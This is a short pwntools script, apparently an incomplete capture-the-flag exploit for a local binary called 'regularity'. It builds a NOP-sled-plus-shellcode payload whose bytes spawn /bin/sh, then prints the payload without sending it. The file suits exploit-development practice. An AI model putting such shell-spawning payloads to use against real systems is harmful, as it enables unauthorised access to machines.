#!/bin/python3

from pwn import *

elf = context.binary = ELF('regularity', checksec= False)
add= 0x0000000000401000


io = process()

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
nop_sled = b"\x90" * 100

payload = nop_sled + shellcode 

print(payload)

